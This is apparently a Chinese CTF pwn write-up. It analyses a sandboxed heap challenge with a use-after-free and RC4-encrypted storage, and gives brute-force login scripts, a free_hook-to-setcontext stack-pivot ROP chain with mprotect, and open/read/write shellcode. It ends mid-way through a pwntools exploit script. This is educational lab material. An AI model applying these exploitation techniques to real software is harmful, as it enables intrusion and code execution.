&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    input(<span class="number">0</span>, s, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)my_strcmp(s, ptr) )<span class="comment">// 对我们的输入调了strlen，\0绕过？</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br></pre></td></tr></table></figure><p>下面是这个逐字节爆破的思路：让char从0到0xFF遍历，成功了（回显不一样）就加到发送内容的后面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crack_username</span>():</span><br><span class="line">    username = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=username + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid username!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid username length!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Username correct!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">                <span class="keyword">return</span> username</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_password</span>():</span><br><span class="line">    password=<span class="string">b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=password + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid password!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid password length!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Password correct!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure><h2 id="控制流与加密">控制流与加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( input_10() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    save_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    delete_data();                <span class="comment">// UAF here</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    edit_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增查删改，程序允许通过exit函数退出。指针和size在全局变量数组里管理，可以看到free存在UAF漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete_data</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = input_10();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)chunks[<span class="number">2</span> * v2 + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    encrypt1(byte_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">    encrypt2(byte_203180, ptr, LODWORD(chunks[<span class="number">2</span> * v2]));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序还有一个点是加密，这是一个用了密钥的对称加密。对常见的加密算法不是很熟所以当时放弃了，其实这是一个rc4。</p><blockquote><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。由于异或运算的对合性，RC4加密解密使用同一套算法。</p></blockquote><p>下面就是一个典型的rc4加密算法初始化的过程，一般初始化要包含三个参数：Sbox数组，密钥，密钥的长度。</p><ol><li class="lvl-3"><p>初始化存储0-255字节的Sbox(其实就是一个数组)</p></li><li class="lvl-3"><p>填充key到256个字节数组中称为Tbox(你输入的key不满256个字节则初始化到256个字节)</p></li><li class="lvl-3"><p>交换s[i]与s[j] i 从0开始一直到255下标结束. j是 s[i]与T[i]组合得出的下标。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *key, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-119h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE v8[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = key[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = ((<span class="type">char</span>)v8[j] + v7 + (<span class="type">unsigned</span> __int8)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v7];</span><br><span class="line">    a1[v7] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化s盒后就是加密了。加密同样接受三个参数：初始化好的sbox，待加密的明文，以及明文长度。</p><p>RC4加密其实就是遍历数据,将数据与sbox进行异或加密,而在此之前还需要交换一次sbox的数据交换完之后 再把s[i] + s[j]的组合当做下标再去异或.下面是本题中的加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> __int8)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> __int8)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序在读写的时候都会调用这套加密，创建chunk的时候会将输入加密后存储，read的时候会先解密读完再加密写回去，free则是会先解密再free（还算有点良心？）。</p><h1>攻击思路（重要）</h1><p>glibc2.27的noexecve的简单沙箱，我们肯定是setcontext栈迁移了，2.27还不用FSOP，直接用hook就行。</p><h2 id="什么是setcontext？">什么是setcontext？</h2><p>这是一个glibc库中的函数，用于恢复上下文。询问ai给出的答案是，这个函数一是可以用于在用户态实现线程和协程，二是作为POSIX标准的残留接口保留了下来。</p><p>这个函数牛逼在什么地方呢，它既然是涉及到切换上下文，那么肯定是对大量的寄存器赋值。这个函数中有<code>mov rsp,xxx</code>这样的gadget，我们可以利用这个东西在用户态劫持栈，实现<br>stack pivot。这种攻击方式在沙箱heap中非常常见，如果我们能劫持一次控制流，就总能想办法用这个gadget实现栈迁移最后ROP。</p><p>在glibc较低的版本中，非常好的地方是，这个函数对rsp赋值还是基于rdi的。以本题为例，<code>setcontext+53</code>的地方存放的是这样的一条指令：<code>mov rsp, [rdi+0xa0]</code>。rdi是我们喜闻乐见的，好控制的寄存器，因此这个很好用。如果我们函数第一参数是一个可控的指针，那就任意栈迁移了，于是可以结合free_hook去利用。</p><p>另外，在较高的版本中比如glibc2.35，这个函数不再依据rdi赋值，而是变成了rdx（偏移也变成了setcontext+61）。这让我们的利用难度有所增加但是不多，因为我们能找到交换rdx和rdi的gadget。以glibc2.35为例，就在0x167420这么一个gadget：<code>0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>, 将<code>rdi+8</code>指向的内容赋值给rdx，将rax写入栈顶，然后跳到<code>rdx+0x20</code>指向的位置执行。这样我们就能间接地实现将rdi和rdx关联起来，利用rdi给rdx赋值然后再setcontext</p><p>最后setcontext这段函数在给rsp赋值后，会<code>mov rcx,[rdi+0xa8]</code>然后<code>push rcx</code>最后ret，因此我们在fakestack地址+0x8的位置就可以写入我们接下来要执行的内容。好用</p><blockquote><p>另外，基于上下文切换还存在一种叫做“SROP”的攻击方法，是利用信号中断等方式，通过在栈上伪造上下文达成控制流劫持，和我们用setcontexgt的gadget有点点类似</p></blockquote><h2 id="回到题目…">回到题目…</h2><p>因此，在低版本还有hook的时候，我们对于沙箱heap题的思路就是free_hook+setcontext栈迁移rop。rop有两种思路，一种是纯rop去libc中找orw，另一种是写shellcode，然后用mprotect先把heap可执行。由于第一次接触时看的exp采用后者，下面笔者也使用后者的方法。</p><p>对于开了沙箱的题目，首先应该动调到我们能够手动控制分配的地方，观察堆的排布，从而确定我们接下来分配的size和堆风水需求，一般tcache和smallbin会比较乱，一般会挑一个size通过取和放将tcache填满后进行我们后续的工作。</p><p>对本题来说具体的攻击步骤如下：</p><ol><li class="lvl-3"><p>简单堆风水，然后用unsortedbin泄露libc，用tcache泄露堆地址</p></li><li class="lvl-3"><p>准备工作，先在一个chunk1中布局我们的fakestack（具体内容见后续）</p></li><li class="lvl-3"><p>然后在另一个chunk2里填充0xa0垃圾数据后，在0xa0偏移写入fakestack的栈顶（chunk1对应位置），然后在0xa8写入ret的gadget地址</p></li><li class="lvl-3"><p>任意地址分配chunk分配到freehook处，在freehook写入setcontext+53的地址</p></li><li class="lvl-3"><p>最后free掉chunk2，触发</p></li></ol><p>此时经历了下述流程：<br>free_hook(rdi=chunk2_addr)<br>-&gt;(mov rsp,[rdi+0xa0]，此时rsp内是chunk1_addr，栈已经被换)<br>-&gt;(mov rcx,[rdi+0xa8];push rcx，此时栈顶是一个ret的地址)<br>-&gt;ret两次，第二次ret就启动了我们fakestack上的rop链</p><h2 id="一些板子">一些板子</h2><p>关于fakestack的布置，这里写一个板子，因为我们首先要调用mprotect，因此要这么布置（开始可以填很多ret无所谓的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p64(ret)</span><br><span class="line">+p64(pop_rdi)</span><br><span class="line">+p64(heap_base)</span><br><span class="line">+p64(pop_rsi)</span><br><span class="line">+p64(<span class="number">0x7000</span>)（size，无所谓，大点也好）</span><br><span class="line">+p64(pop_rdx)</span><br><span class="line">+p64(<span class="number">0x7</span>)</span><br><span class="line">+p64(mprotect)（直接libc.sym就行）</span><br><span class="line">+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)（指向shellcode，也就是下一行的起始地址就行）</span><br><span class="line">+asm(shellcode)（orw）</span><br></pre></td></tr></table></figure><p>然后shellcode如下，buffer随便写一个能读写的地址就行，heap+0x3000这种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1>总结</h1><p>最简单的沙箱堆，但是也花了小半天来复现。更高的版本也无非就是用fsop的链子，那一次的控制流劫持换到其他点然后后续还是一样的。或者是先跳到magic_gadget，就是麻烦了点。</p><h1>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p=remote(&quot;0192d66238177833936ff330dfec8bbd.huj5.dg04.ciihw.cn&quot;,43631)</span></span><br><span class="line"><span class="comment"># charset = &quot;\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 爆破用户名</span></span><br><span class="line"><span class="comment"># def crack_username():</span></span><br><span class="line"><span class="comment">#     username = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1, 128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=username + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid username!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid username length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Username correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(username)</span></span><br><span class="line"><span class="comment">#                 return username</span></span><br><span class="line"><span class="comment"># # 4dm1n</span></span><br><span class="line"><span class="comment"># def crack_password():</span></span><br><span class="line"><span class="comment">#     password=b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1,128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=password + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, b&#x27;4dm1n&#x27;)</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your password:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid password!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid password length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Password correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 return password</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(crack_username())</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=elf.process()</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span 